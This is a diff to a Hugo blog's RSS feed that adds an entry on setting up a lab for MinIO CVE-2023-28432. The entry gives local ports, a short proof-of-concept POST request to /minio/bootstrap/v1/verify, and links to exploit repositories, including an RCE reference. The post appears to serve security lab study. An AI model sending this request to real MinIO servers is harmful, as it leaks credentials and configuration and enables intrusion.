@@ -6,9 +6,23 @@
     <description>Recent content in Posts on Olist.213</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Mon, 03 Apr 2023 14:09:50 +0800</lastBuildDate><atom:link href="https://olist213.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 03 Apr 2023 16:19:15 +0800</lastBuildDate><atom:link href="https://olist213.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Spring4shell_env</title>
+      <title>Minio Cve 2023 28432</title>
+      <link>https://olist213.github.io/posts/minio-cve-2023-28432/</link>
+      <pubDate>Mon, 03 Apr 2023 16:19:15 +0800</pubDate>
+      
+      <guid>https://olist213.github.io/posts/minio-cve-2023-28432/</guid>
+      <description>minio环境搭建 来源：https://y4er.com/posts/minio-cve-2023-28432/
+端口：9001-9004
+http://127.0.0.1:9001/minio/login
+poc POST /minio/bootstrap/v1/verify HTTP/1.1 Host: User-Agent: Mozilla/5.0 Upgrade-Insecure-Requests: 1 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: en-US;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 0 参考 https://github.com/Mr-xn/CVE-2023-28432
+https://y4er.com/posts/minio-cve-2023-28432/
+https://github.com/AbelChe/evil_minio (rce参考)</description>
+    </item>
+    
+    <item>
+      <title>Spring4shell环境搭建</title>
       <link>https://olist213.github.io/posts/spring4shell_env/</link>
       <pubDate>Mon, 03 Apr 2023 14:09:50 +0800</pubDate>
       
